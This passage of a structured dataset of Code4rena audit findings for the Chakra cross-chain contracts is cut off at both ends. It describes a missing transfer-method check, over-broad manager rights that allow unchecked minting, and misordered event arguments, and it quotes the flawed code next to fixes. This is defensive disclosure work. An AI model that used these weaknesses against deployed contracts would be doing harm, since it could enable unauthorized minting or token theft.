[`handler_erc20::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/handler_erc20.cairo#L122) checks to ensure that `ERC20Method` is `TRANSFER` at destination before handling tokens:\n```solidity\n    assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n```\nChecking for the `ERC20Method` at the destination is crucial due to the nature of cross-chain transactions and the need for validation and security on both ends of the transaction.\n\nHowever [`ChakraSettlementHandler::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330) only decodes the transfer payload and proceeds to handle tokens without actually verifying that the method is transfer.\n```solidity\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n>>              // @audit-info Missing method validation\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n`ERC20Method` should be validated before handling tokens in `receive_cross_chain_msg()`:\n```diff\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n+               require(transfer_payload.method_id == ERC20Method.Transfer, \"ERC20Method must TRANSFER\");\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nIn cross-chain transactions, the integrity and correctness of the transaction must be maintained across different blockchain environments, which might have varying security measures, protocols. However, the missing `ERC20method` validation at destination allows cross-chain tx with a different `ERC20Method` from `Transfer` to be handled as transfer transactions when they actually aren't.\n", "recommendation_md": "## Recommended Mitigation Steps\n`ERC20Method` should be validated before handling tokens in `receive_cross_chain_msg()`:\n```diff\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n+               require(transfer_payload.method_id == ERC20Method.Transfer, \"ERC20Method must TRANSFER\");\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nWhen sending a cross-chain tx, the `sender` locks/burns some amount of tokens at `source` chain. With this, the `recipient` then unlocks or gets minted same amount of tokens at the `destination`.\nBasically this is similar to `Token Transfer` from one address to another.\n\nAs such, [`handler_erc20::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/handler_erc20.cairo#L122) checks to ensure that `ERC20Method` is `TRANSFER` at destination before handling tokens:\n```solidity\n    assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n```\nChecking for the `ERC20Method` at the destination is crucial due to the nature of cross-chain transactions and the need for validation and security on both ends of the transaction.\n\nHowever [`ChakraSettlementHandler::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330) only decodes the transfer payload and proceeds to handle tokens without actually verifying that the method is transfer.\n```solidity\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n>>              // @audit-info Missing method validation\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330\n\n\n# Vulnerability details\n\n## Impact\nIn cross-chain transactions, the integrity and correctness of the transaction must be maintained across different blockchain environments, which might have varying security measures, protocols. However, the missing `ERC20method` validation at destination allows cross-chain tx with a different `ERC20Method` from `Transfer` to be handled as transfer transactions when they actually aren't.\n\n## Proof of Concept\nWhen sending a cross-chain tx, the `sender` locks/burns some amount of tokens at `source` chain. With this, the `recipient` then unlocks or gets minted same amount of tokens at the `destination`.\nBasically this is similar to `Token Transfer` from one address to another.\n\nAs such, [`handler_erc20::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/handler_erc20.cairo#L122) checks to ensure that `ERC20Method` is `TRANSFER` at destination before handling tokens:\n```solidity\n    assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n```\nChecking for the `ERC20Method` at the destination is crucial due to the nature of cross-chain transactions and the need for validation and security on both ends of the transaction.\n\nHowever [`ChakraSettlementHandler::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330) only decodes the transfer payload and proceeds to handle tokens without actually verifying that the method is transfer.\n```solidity\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n>>              // @audit-info Missing method validation\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n`ERC20Method` should be validated before handling tokens in `receive_cross_chain_msg()`:\n```diff\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n+               require(transfer_payload.method_id == ERC20Method.Transfer, \"ERC20Method must TRANSFER\");\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330\n\n\n# Vulnerability details\n\n## Impact\nIn cross-chain transactions, the integrity and correctness of the transaction must be maintained across different blockchain environments, which might have varying security measures, protocols. However, the missing `ERC20method` validation at destination allows cross-chain tx with a different `ERC20Method` from `Transfer` to be handled as transfer transactions when they actually aren't.\n\n## Proof of Concept\nWhen sending a cross-chain tx, the `sender` locks/burns some amount of tokens at `source` chain. With this, the `recipient` then unlocks or gets minted same amount of tokens at the `destination`.\nBasically this is similar to `Token Transfer` from one address to another.\n\nAs such, [`handler_erc20::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/handler_erc20.cairo#L122) checks to ensure that `ERC20Method` is `TRANSFER` at destination before handling tokens:\n```solidity\n    assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n```\nChecking for the `ERC20Method` at the destination is crucial due to the nature of cross-chain transactions and the need for validation and security on both ends of the transaction.\n\nHowever [`ChakraSettlementHandler::receive_cross_chain_msg()`](https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/ChakraSettlementHandler.sol#L318-L330) only decodes the transfer payload and proceeds to handle tokens without actually verifying that the method is transfer.\n```solidity\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n>>              // @audit-info Missing method validation\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\n`ERC20Method` should be validated before handling tokens in `receive_cross_chain_msg()`:\n```diff\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n+               require(transfer_payload.method_id == ERC20Method.Transfer, \"ERC20Method must TRANSFER\");                \n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n                ---SNIP---\n            }\n            ---SNIP---\n        }\n```\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-514", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 514, "page_start": null, "title": "Excessive Authority Granted to Managers in the `ckr_btc.cairo` Contract Presents Significant Management Risks", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L134-L218\n\n\n# Vulnerability details\n\nIn the `ckr_btc.cairo` contract, managers possess broad authority and can execute all functions except `upgrade()`. This level of access contrasts with typical Solidity practices, where such functions would require `owner` privileges.\n\nOne of the primary concerns is that any existing manager has the ability to add new managers. This unchecked ability to expand the number of managers can lead to an uncontrolled increase in the number of authorized managers, creating a potential security risk. Without additional checks or approval mechanisms, this design flaw could be exploited, leading to a dilution of control and increased risk of unauthorized actions.\n\nFurthermore, managers also have the ability to designate operator roles. Operators, in turn, have the authority to mint and burn tokens, which compounds the risk if these roles are not properly managed. This level of access could easily lead to a situation where control over critical functions is decentralized in a manner that might not have been intended by the original design.\n\nIt is unclear whether this design was intentional, but it introduces significant management risks that should be addressed.\n```js\n        fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n        fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n\n        fn mint_to(ref self: ContractState, to: ContractAddress, amount: u256) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_operators.read(caller) == 1, Errors::NOT_OPERATOR);\n            let old_balance = self.erc20.balance_of(to);\n            self.erc20.mint(to, amount);\n            let new_balance = self.erc20.balance_of(to);\n            return new_balance == old_balance + amount;\n        }\n```\n## Impact\n\nThe excessive authority granted to managers poses a significant management risk. The potential for an uncontrolled expansion of manager roles, coupled with the ability to assign operator roles, could lead to serious security vulnerabilities, including unauthorized minting or burning of tokens.\n## Proof of Concept\n\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nIt is recommended to follow best practices as implemented in Solidity contracts, where only the `owner` has the authority to add or remove managers and operators. This can be achieved by modifying the current implementation to enforce `owner` checks when adding new managers or operators.\n\nExample of a safer approach:\n```diff\n    fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n    fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe excessive authority granted to managers poses a significant management risk. The potential for an uncontrolled expansion of manager roles, coupled with the ability to assign operator roles, could lead to serious security vulnerabilities, including unauthorized minting or burning of tokens.\n", "recommendation_md": "## Recommended Mitigation Steps\nIt is recommended to follow best practices as implemented in Solidity contracts, where only the `owner` has the authority to add or remove managers and operators. This can be achieved by modifying the current implementation to enforce `owner` checks when adding new managers or operators.\n\nExample of a safer approach:\n```diff\n    fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n    fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L134-L218\n\n**container:**\n# Vulnerability details\n\nIn the `ckr_btc.cairo` contract, managers possess broad authority and can execute all functions except `upgrade()`. This level of access contrasts with typical Solidity practices, where such functions would require `owner` privileges.\n\nOne of the primary concerns is that any existing manager has the ability to add new managers. This unchecked ability to expand the number of managers can lead to an uncontrolled increase in the number of authorized managers, creating a potential security risk. Without additional checks or approval mechanisms, this design flaw could be exploited, leading to a dilution of control and increased risk of unauthorized actions.\n\nFurthermore, managers also have the ability to designate operator roles. Operators, in turn, have the authority to mint and burn tokens, which compounds the risk if these roles are not properly managed. This level of access could easily lead to a situation where control over critical functions is decentralized in a manner that might not have been intended by the original design.\n\nIt is unclear whether this design was intentional, but it introduces significant management risks that should be addressed.\n```js\n        fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n        fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n\n        fn mint_to(ref self: ContractState, to: ContractAddress, amount: u256) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_operators.read(caller) == 1, Errors::NOT_OPERATOR);\n            let old_balance = self.erc20.balance_of(to);\n            self.erc20.mint(to, amount);\n            let new_balance = self.erc20.balance_of(to);\n            return new_balance == old_balance + amount;\n        }\n```\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L134-L218\n\n\n# Vulnerability details\n\nIn the `ckr_btc.cairo` contract, managers possess broad authority and can execute all functions except `upgrade()`. This level of access contrasts with typical Solidity practices, where such functions would require `owner` privileges.\n\nOne of the primary concerns is that any existing manager has the ability to add new managers. This unchecked ability to expand the number of managers can lead to an uncontrolled increase in the number of authorized managers, creating a potential security risk. Without additional checks or approval mechanisms, this design flaw could be exploited, leading to a dilution of control and increased risk of unauthorized actions.\n\nFurthermore, managers also have the ability to designate operator roles. Operators, in turn, have the authority to mint and burn tokens, which compounds the risk if these roles are not properly managed. This level of access could easily lead to a situation where control over critical functions is decentralized in a manner that might not have been intended by the original design.\n\nIt is unclear whether this design was intentional, but it introduces significant management risks that should be addressed.\n```js\n        fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n        fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n\n        fn mint_to(ref self: ContractState, to: ContractAddress, amount: u256) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_operators.read(caller) == 1, Errors::NOT_OPERATOR);\n            let old_balance = self.erc20.balance_of(to);\n            self.erc20.mint(to, amount);\n            let new_balance = self.erc20.balance_of(to);\n            return new_balance == old_balance + amount;\n        }\n```\n## Impact\n\nThe excessive authority granted to managers poses a significant management risk. The potential for an uncontrolled expansion of manager roles, coupled with the ability to assign operator roles, could lead to serious security vulnerabilities, including unauthorized minting or burning of tokens.\n## Proof of Concept\n\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nIt is recommended to follow best practices as implemented in Solidity contracts, where only the `owner` has the authority to add or remove managers and operators. This can be achieved by modifying the current implementation to enforce `owner` checks when adding new managers or operators.\n\nExample of a safer approach:\n```diff\n    fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n    fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L134-L218\n\n\n# Vulnerability details\n\nIn the `ckr_btc.cairo` contract, managers possess broad authority and can execute all functions except `upgrade()`. This level of access contrasts with typical Solidity practices, where such functions would require `owner` privileges.\n\nOne of the primary concerns is that any existing manager has the ability to add new managers. This unchecked ability to expand the number of managers can lead to an uncontrolled increase in the number of authorized managers, creating a potential security risk. Without additional checks or approval mechanisms, this design flaw could be exploited, leading to a dilution of control and increased risk of unauthorized actions.\n\nFurthermore, managers also have the ability to designate operator roles. Operators, in turn, have the authority to mint and burn tokens, which compounds the risk if these roles are not properly managed. This level of access could easily lead to a situation where control over critical functions is decentralized in a manner that might not have been intended by the original design.\n\nIt is unclear whether this design was intentional, but it introduces significant management risks that should be addressed.\n```js\n        fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n        fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n\n        fn mint_to(ref self: ContractState, to: ContractAddress, amount: u256) -> bool {\n            let caller = get_caller_address();\n@>            assert(self.chakra_operators.read(caller) == 1, Errors::NOT_OPERATOR);\n            let old_balance = self.erc20.balance_of(to);\n            self.erc20.mint(to, amount);\n            let new_balance = self.erc20.balance_of(to);\n            return new_balance == old_balance + amount;\n        }\n```\n## Impact\n\nThe excessive authority granted to managers poses a significant management risk. The potential for an uncontrolled expansion of manager roles, coupled with the ability to assign operator roles, could lead to serious security vulnerabilities, including unauthorized minting or burning of tokens.\n## Proof of Concept\n\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nIt is recommended to follow best practices as implemented in Solidity contracts, where only the `owner` has the authority to add or remove managers and operators. This can be achieved by modifying the current implementation to enforce `owner` checks when adding new managers or operators.\n\nExample of a safer approach:\n```diff\n    fn add_manager(ref self: ContractState, new_manager: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_managers.read(new_manager) == 0, Errors::ALREADY_MANAGER);\n\n\n            self.chakra_managers.write(new_manager, 1);\n            self\n                .emit(\n                    ManagerAdded {\n                        operator: caller, new_manager: new_manager, added_at: get_block_timestamp()\n                    }\n                );\n            return self.chakra_managers.read(new_manager) == 1;\n        }\n    fn add_operator(ref self: ContractState, new_operator: ContractAddress) -> bool {\n            let caller = get_caller_address();\n-            assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n+            self.ownable.assert_only_owner();\n            assert(self.chakra_operators.read(new_operator) == 0, Errors::ALREADY_OPERATOR);\n\n\n            self.chakra_operators.write(new_operator, 1);\n            self\n                .emit(\n                    OperatorAdded { new_operator: new_operator, added_at: get_block_timestamp() }\n                );\n            return self.chakra_operators.read(new_operator) == 1;\n        }\n```\n\n\n## Assessed type\n\nOther"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-528", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 528, "page_start": null, "title": "Incorrect argument order in `CrossChainHandleResult` event emission leads to incorrect cross-chain message finalization", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L238-L241\n\n\n# Vulnerability details\n\n## Impact\nWhen a cross-chain ERC20 transfer is initiated, the destination `ChakraSettlement` contract processes the message via the `receive_cross_chain_msg` function and emits a `CrossChainHandleResult` event. This event is crucial for Chakra validators, as they rely on its arguments to correctly call `ChakraSettlement::receive_cross_chain_callback` on the source chain to finalize the message.\n\nThe issue lies in the incorrect ordering of arguments in the `CrossChainHandleResult` event. This misordering causes the validators to pass incorrect values to the `receive_cross_chain_callback` function, leading to improper message finalization:\n```solidity\n// cross chain handle result emit by receive side\nevent CrossChainHandleResult(\n    uint256 indexed txid,\n    CrossChainMsgStatus status,\n    string from_chain,\n    string to_chain,\n    address from_handler,\n    uint256 to_handler,\n    PayloadType payload_type\n);\n\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n>>>        contract_chain_name, // @audit this should be `from_chain`\n>>>        from_chain,          // @audit this should be `contract_chain_name`\n>>>        address(to_handler), // @audit this should be `from_handler`\n>>>        from_handler,        // @audit this should be `to_handler`\n        payload_type\n    